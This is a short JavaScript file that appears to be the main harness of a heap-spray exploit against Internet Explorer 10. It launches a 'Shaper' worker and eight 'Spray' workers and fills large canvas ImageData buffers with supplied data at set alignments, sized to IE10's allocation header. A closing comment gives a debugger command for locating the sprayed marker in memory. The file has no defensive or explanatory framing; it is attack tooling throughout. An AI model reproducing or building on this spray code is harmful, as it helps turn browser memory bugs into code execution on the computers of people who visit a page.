var HEAP_BLOCK_SIZE = ((0x1000000 - 0x20) / 4);// == malloc(0x1000000); 0x20 == header in IE10 case
var WORKERS_COUNT = 0x8;

var gShaper = new Worker("Shaper.js");

gShaper.onerror = function(e)
{
	alert("shaper error!");
}

gShaper.onmessage = function(e)
{
	memory = e.data;
	for (var i = 0; i < WORKERS_COUNT; i++)
	{
		var spray = new Worker("Spray.js");

		spray.onerror = function(e)
		{
			alert("spray fragment err");
		}
		spray.onmessage = function(e)
		{
			alert(">thread : " + e.data);
		}
		
		spray.postMessage( { "id" : i, "mem" : memory } );
	}
}

function SprayTheWorld(data, alignment, skippedBytes)
{
	var canvas = document.createElement("canvas");
	var context = canvas.getContext("2d");
	
	var img = context.createImageData(1, HEAP_BLOCK_SIZE);	
	for (var i = 0; i < data.length; i++)
		img.data[i] = data[i];//mark this used memory!
		
	gShaper.postMessage( { "img" : img, "alig" : (1 << (4 * alignment)) - 1, "data" : data, "skipped" : skippedBytes } );
}

//s -d 0x00000000 L?0xBF000000 0x70616523
